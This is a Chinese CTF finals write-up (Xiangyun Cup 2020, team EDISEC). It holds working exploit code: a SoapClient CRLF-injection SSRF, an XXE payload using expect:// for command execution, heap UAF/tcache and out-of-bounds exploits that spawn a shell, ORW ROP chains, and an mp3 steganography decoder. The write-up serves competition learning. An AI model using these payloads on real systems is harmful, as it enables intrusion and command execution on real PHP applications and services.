---
title: 第三届祥云杯决赛 WriteUp
contest: 祥云杯
year: 2020
difficulty: medium
vuln_type: misc_unknown
tags: [SoapClient-SSRF, XXE, expect, mp3-bit, custom-VM, OLLVM-flatten, heap-uaf, thread-chain, memcpy-redirect, ORW, EDISEC]
attack_chain:
  - Web1 message_board 用 SoapClient null+location+uri 构造 SSRF 到 127.0.0.1/index.php?s=login 携带 admin:password + PHPSESSID
  - Web2 babyweb 用 XXE + expect://mv$IFSxx.png$IFSxx.php 触发命令执行
  - Misc1 Twin shadow 按 list.txt 偏移从 mp3 逐字节读 LSB 还原 1.txt
  - PWN1 pwn_ad3 自定义 VM 指令 (push/push_r/pop_r/show/again) + show 泄栈堆 + free_hook 写 system
  - PWN2 sitnote UAF + unlink + edit(8, p64(0x6c1ec8)) 篡 fd + tcache 申请到 free_hook
  - PWN3 message_system 0xf 线程环形链路 + show_idx(9, 0xffffffff) 越界读 0x18 字节泄 libc
  - PWN3 续 edit_idx(9, index=0x100000000-0x10, p64(memcpy)+...+system) 触发 ORW 链
  - PWN4 note XOR 密钥登录 + 0x4e0 chunk 重叠泄漏 + 0x4f2 越界读相邻 chunk key + environ 泄栈
  - PWN4 续 ORW open/read/write 直接读 flag 文件
key_payload: 'SoapClient SSRF 头注入 + XXE expect:// + ORW 链 + UAF tcache + 线程环形越界'
one_liner: 祥云杯决赛多方向题集：SoapClient SSRF 登录 + XXE expect + mp3 LSB + 自定义 VM + UAF + 线程环形越界 + XOR 密钥 + ORW。
lesson: SOAP SSRF 头注入（user_agent CRLF）+ expect:// 协议是经典 PHP CTF 套路；多线程链路越界通过环形数据流绕过深度限制。
quality: high
---

# 第三届"祥云杯"网络安全大赛决赛 WriteUp By EDISEC

**来源**: ctfiot.com ID 135246
**战队**: EDI 安全（招新广告中：诚招 re/crypto/pwn 方向师傅）

## 01 Web

### 1. message_board
```php
$target = 'http://127.0.0.1/index.php?s=login';
$b = new SoapClient(null, array(
  'location' => $target,
  'user_agent' => "wupco^^Content-Type: application/x-www-form-urlencoded^^Cookie: PHPSESSID=edisec^^Content-Length: 32^^^^username=admin&password=password",
  'uri' => "a"
));
$a = serialize($b);
$a = str_replace('^^', "\r\n", $a);
$a = str_replace('&', '%26', $a);
echo bin2hex(urldecode($a));
```
- SoapClient `null` 模式 + 自定义 user_agent CRLF 注入
- 触发反序列化后 SSRF 到本地 login 接口，POST admin:password

### 2. babyweb
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ELEMENT name ANY >
  <!ENTITY xxe SYSTEM "expect://mv$IFSxx.png$IFSxx.php" >
]>
<root><name>&xxe;</name></root>
```
- expect:// 协议 + `$IFS` 替换空格，触发命令执行

## 02 Misc

### 1. Twin shadow
```python
n = 598795
f = open('list.txt','r').read()
steps = f.split("n")
step_list = [int(i, 16) for i in steps]
file = open('1.mp3','rb')
num = 0
while num < len(step_list):
    file.seek(n, 0)
    n += step_list[num]
    file_read_result = file.read(1)
    result = result + bin(ord(file_read_result))[-1]
    num += 1
# 把 result 按 8bit 切，chr(int(i,2)) 还原
```

## 03 PWN

### 1. pwn_ad3（自定义 VM）
```python
# VM 指令: push(9) push_r(0xb) pop_r(0xd) show(0xe) again(0x12)
# 攻击:
# 1. show(7)+again 泄堆地址 (heap_addr1, heap_addr2) + 栈地址
# 2. show(3)+push(free_hook-8)+push(libc1) 写 "/bin/sh"+system 到 free_hook
pay = show(7) + again()  # 触发泄地址
pay = show(3) + push(free_hook-8) + push(libc1) + push(u32('/bin')) + pop_r(0) + ...
```

### 2. sitnote（UAF + tcache）
```python
for i in range(0xa): add(i, 0x78)        # 申请 10 个
for i in range(9): delete(i)              # 释放 9 个
for i in range(0x9): add(i, 0x78)         # 重新申请 9 个
add(10, 0x78); delete(9); delete(10)      # double free
edit(8, p64(0x6c1ec8))                    # 改 fd 到 free_hook-8 附近
add(9, 0x78); add(10, 0x78)               # 占位
edit(9, '/bin/sh\x00'); edit(10, p64(0x40ab70))  # system
delete(9)                                  # 触发 system("/bin/sh")
```

### 3. message_system（0xf 线程环形链路 + 越界）
```python
# 创建 0xf 个线程，link(i, 9, i+1, 0) 构成 0→1→2→...→9 环形
# 通过主线程选项 10 向 thread 0 发 id=9, opt=2 的包
# 数据流: 主→0→1→...→9 然后回程 9→8→...→0→主（绕过 v15<=7 深度限制）
for i in range(0xf): add(i, 'keer', 'aaaa')
for i in range(0x9): link(i, 9, i+1, 0)

# show_idx(9, 0xffffffff) 越界读 0x18 字节，泄 __libc_start_main+0x30 → libc_base
show_idx(9, 0xffffffff)
leak = u64(io.recvuntil('\x7f')[-6:] + '\x00\x00')
libc_base = leak - 0x225b0 - 0x22000 - 0x30

# edit_idx 写 memcpy + pop_rdi + /bin/sh + system 进栈，调用时触发
index = 0x100000000 - (0x320 // 0x20)
pay = p64(0) + p64(memcpy) + p64(pop_rdi) + p64(bin_sh) + p64(system)
edit_idx(9, index, pay)
```

### 4. note（XOR 密钥 + UAF + ORW）
```python
# 登录：challenge 15 字节，每字节 i:0..14，response = chr((byte ^ i ^ 0x11) XOR key)
# XOR 密钥 key 0x10 字节，从相邻 0x4f0 chunk 内容与 'a' XOR 提取
login()
add(0x4e0, 'a'*0x10, 0); add(0x4e0, 'a'*0x10, 0)
for i in range(0x100): delete(0)  # 填满 tcache
add(0x4f2, 'a'*0x4f0, 1)          # 触发相邻 0x4f0 chunk 部分内容
show(0)                            # 泄相邻 chunk 头 0x10 字节
key = [ord(data[0x4f0+i]) ^ ord('a') for i in range(0x10)]  # 提取 key

# 后续：复杂堆风水 + 0x191 假 chunk + 改 __free_hook + environ 泄栈
# ORW: pop_rax=2 + pop_rdi=./flag + pop_rsi=0 + syscall + pop_rax=0 + read(3, ...) + write(1, ...)
pay = './flag\x00\x00' + p64(pop_rdi) + p64(stack_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)  # open
pay += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x30)*2 + p64(pop_rsi) + p64(stack_addr-0x300) + p64(syscall)  # read
pay += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_addr-0x300) + p64(syscall)  # write
```

## 评价
EDI 安全战队的祥云杯决赛全解，覆盖 Web SOAP/XXE + Misc mp3 LSB + 4 道 PWN（自定义 VM / UAF / 多线程环形越界 / XOR 密钥 ORW）。是中级到高级 PWN 综合题集，多题涉及 OLLVM 反混淆实战。
